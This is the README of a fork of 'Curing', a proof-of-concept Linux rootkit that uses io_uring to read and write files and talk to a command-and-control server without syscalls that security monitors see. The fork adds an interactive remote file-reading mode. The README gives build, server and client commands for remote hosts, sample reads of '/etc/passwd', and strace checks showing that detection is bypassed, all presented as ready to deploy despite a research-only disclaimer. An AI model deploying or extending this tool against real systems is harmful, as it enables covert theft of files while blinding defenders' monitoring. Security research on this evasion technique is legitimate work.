# Curing 💊 - Enhanced Interactive Version

**Curing** is a POC rootkit that uses `io_uring` to perform file operations and network communication without traditional syscalls, making it invisible to security tools that only monitor syscalls.

## 🆕 Enhanced Features (This Fork)

This enhanced version adds **interactive file reading capabilities** and **flexible deployment options**:

- 🎯 **Interactive Mode**: Real-time file reading with command-line interface
- 🌐 **Flexible Networking**: Support for custom IP addresses and ports
- ⚙️ **Command-line Arguments**: Override config files with CLI parameters
- 📁 **Any File Access**: Read any accessible file on the target system
- 🔧 **Easy Deployment**: Simple setup for local testing or remote operations

## Original Project

The original Curing project was created by [amitschendel](https://github.com/amitschendel/curing) and demonstrates io_uring bypass techniques against Linux security tools. The idea was born at CCC conference #38c3.

📖 **Original article**: [io_uring rootkit bypasses Linux security](https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security)

## 🚀 Quick Start

### 1. Build
```bash
make clean && make all
```

### 2. Start Server
```bash
# Default (localhost:8888)
./build/server

# Custom host and port
./build/server -host 0.0.0.0 -port 9999
```

### 3. Interactive Client
```bash
# Local connection
./build/client -interactive

# Remote connection
./build/client -interactive -host 192.168.1.100 -port 9999
```

### 4. Read Files
```
> /etc/passwd
> /etc/hostname
> /tmp/myfile.txt
> quit
```

## 📁 Project Structure

```
curing/
├── cmd/                    # Client application
├── server/                 # Server application  
├── pkg/
│   ├── client/            # Client implementation
│   ├── server/            # Server implementation
│   ├── common/            # Shared types and commands
│   └── config/            # Configuration management
├── poc/                   # Original POC demonstration
└── io_uring_example/      # Simple io_uring usage example
```

## 📚 Documentation

- **[Quick Start Guide](QUICK_START.md)** - 5-minute setup guide
- **[Original POC Demo](poc/POC.md)** - Falco bypass demonstration
- **[io_uring Example](io_uring_example/README.md)** - Simple io_uring usage
- **[Changelog](CHANGELOG.md)** - What's new in this version

## 🔧 How it works

### Enhanced Interactive Mode
1. **Client** connects to server using io_uring network operations
2. **User** enters file paths interactively  
3. **Server** reads files using io_uring file operations
4. **Results** are sent back through io_uring network operations
5. **No traditional syscalls** are used for file access or network communication

### Original C2 Mode
The original mode works as a traditional C2 where the client pulls predefined commands from the server.

## ✨ Features

### Enhanced Features (This Fork)
- ✅ **Interactive file reading** - Real-time file access
- ✅ **Flexible networking** - Custom IP/port support  
- ✅ **Command-line arguments** - Override config files
- ✅ **Remote deployment** - Easy setup across networks
- ✅ **Help system** - Built-in usage guides

### Original Features
- ✅ **Read files** - Using io_uring file operations
- ✅ **Write files** - Using io_uring file operations  
- ✅ **Create symbolic links** - Using io_uring operations
- ✅ **C2 communication** - Using io_uring network operations
- ❌ **Execute processes** - [Blocked by io_uring limitations](https://github.com/axboe/liburing/discussions/1307)

## 🔍 Bypass Verification

Verify that no traditional syscalls are used:
```bash
# Monitor file operations
strace -f -e trace=openat,read,write -p $(pgrep server)

# Monitor network operations  
strace -f -e trace=socket,connect,send,recv -p $(pgrep client)
```

You should see **no file or network related syscalls** because everything goes through io_uring.

## 📋 Requirements

- **Linux kernel 5.1+** (io_uring support)
- **Go 1.21.6+** 
- **Build tools** (make, gcc for io_uring example)

## ⚠️ Disclaimer

**FOR SECURITY RESEARCH AND EDUCATION ONLY**

This project demonstrates io_uring bypass techniques against syscall-based security monitoring. 
- ✅ Security research and education
- ✅ Testing your own systems
- ❌ Unauthorized access to systems
- ❌ Malicious activities

Users are responsible for compliance with applicable laws and regulations.

## 🤝 Contributing

This is an enhanced fork of the original [Curing project](https://github.com/amitschendel/curing). 

**Enhancements in this fork:**
- Interactive file reading capabilities
- Flexible networking with custom IP/port support
- Command-line argument system
- Enhanced documentation and user experience

**Original project credit:** [amitschendel](https://github.com/amitschendel/curing)